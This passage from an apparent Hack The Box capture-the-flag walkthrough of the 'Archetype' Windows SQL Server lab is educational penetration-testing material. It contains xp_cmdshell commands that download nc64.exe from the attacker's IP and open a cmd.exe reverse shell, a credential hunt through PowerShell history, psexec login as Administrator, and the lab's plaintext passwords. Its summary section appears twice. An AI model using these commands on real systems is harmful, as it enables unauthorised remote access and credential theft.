inet 10.10.XX.XX/23 scope global tun0
```

That 10.10.XX.XX is your HTB VPN IP address.

## Alternative Methods

If the above doesn't work, try these:

```bash
# Option 1: ifconfig with grep
ifconfig | grep -A 1 tun0

# Option 2: Just the IP address
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'

# Option 3: Check all interfaces
ip -4 addr
```

## Important Notes

1. **Do NOT use**:
   - 127.0.0.1 (localhost)
   - Your local network IP (192.168.x.x)
   - Your public internet IP

2. **The target machine must be able to reach your IP**:
   - This is why we use the VPN IP - it creates a direct connection between you and the target

3. **Verify connectivity**:
   - You can test if your HTTP server is accessible by running:
     ```bash
     curl http://YOUR_VPN_IP:80
     ```
     from another terminal on your machine

When you replace "YOUR_IP_ADDRESS" in the commands, use this VPN IP address. For example:

```sql
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.26/nc64.exe -outfile nc64.exe"
```

And for the reverse shell:

```sql
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.26 443"
```
### Task 8: Capture the Root Flag

**Solution:**
```bash
# Check PowerShell history for credentials
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Use discovered Administrator credentials with Impacket's psexec.py
python3 psexec.py administrator@{TARGET_IP}

# Navigate to Administrator's desktop and read the root flag
cd C:\Users\Administrator\Desktop
type root.txt
```
The PowerShell history file reveals the Administrator password: MEGACORP_4dm1n!!

**Importance:** This demonstrates the importance of proper credential handling and the risks of leaving command history files accessible, as well as how to leverage discovered credentials for privilege escalation.

**Flag Captured:** Root Flag (actual value redacted)

## Summary

This CTF challenge provided hands-on experience with Windows server penetration testing. The most valuable lessons from this exercise include:

1. The importance of thorough enumeration of network services
2. How insecure file storage can lead to credential exposure
3. Leveraging database server misconfigurations for command execution
4. Using PowerShell history files for post-exploitation intelligence gathering
5. The critical nature of proper credential management

These skills are directly applicable to real-world scenarios such as internal network penetration tests and security assessments of Windows-based environments.

## Appendix: Command Outputs

### Task 1 Command Output
```
Starting Nmap 7.91 ( https://nmap.org )
Nmap scan report for 10.10.10.x
Host is up (0.089s latency).
Not shown: 65523 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00
```

**Key observations:**
- Port 1433 is running Microsoft SQL Server 2017
- The target is running Windows Server 2019
- SMB services are available on ports 139 and 445

### Task 2 Command Output
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

**Key observations:**
- "backups" is the non-administrative share
- Standard administrative shares (ADMIN$, C$, IPC$) are also available

### Task 3 Command Output
```
<DTSConfigurationFileInfo>
   <Version>...</Version>
   <UserName>...</UserName>
</DTSConfigurationFileInfo>
<Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
   <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Auto Translate=False;</ConfiguredValue>
</Configuration>
```

**Key observations:**
- Username: ARCHETYPE\sql_svc
- Password: M3g4c0rp123
- These credentials are for SQL Server access

## Summary

This CTF challenge provided hands-on experience with Windows server penetration testing. The most valuable lessons from this exercise include:

1. The importance of thorough enumeration of network services
2. How insecure file storage can lead to credential exposure
3. Leveraging database server misconfigurations for command execution
4. Using PowerShell history files for post-exploitation intelligence gathering
5. The critical nature of proper credential management

These skills are directly applicable to real-world scenarios such as internal network penetration tests and security assessments of Windows-based environments.
`
